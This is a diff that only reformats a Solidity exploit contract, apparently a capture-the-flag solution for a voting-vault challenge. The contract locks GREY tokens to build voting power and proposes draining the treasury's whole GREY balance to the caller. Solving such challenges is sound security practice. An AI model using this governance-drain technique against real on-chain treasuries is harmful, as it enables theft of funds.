@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity 0.8.15;
 
-import { Setup } from "src/voting-vault/Setup.sol";
+import {Setup} from "src/voting-vault/Setup.sol";
 
 contract Exploit {
     Setup setup;
@@ -18,7 +18,9 @@ contract Exploit {
 
         // Lock 1 GREY in the voting vault 10 times
         setup.grey().approve(address(setup.vault()), 10);
-        for (uint256 i = 0; i < 10; i++) setup.vault().lock(1);
+        for (uint256 i = 0; i < 10; i++) {
+            setup.vault().lock(1);
+        }
 
         // Current voting power is 10
         assert(setup.vault().votingPower(address(this), block.number) == 10);
@@ -31,9 +33,7 @@ contract Exploit {
 
         // Create proposal to drain GREY from the treasury
         proposalId = setup.treasury().propose(
-            address(setup.grey()), 
-            setup.grey().balanceOf(address(setup.treasury())),
-            msg.sender
+            address(setup.grey()), setup.grey().balanceOf(address(setup.treasury())), msg.sender
         );
     }
 
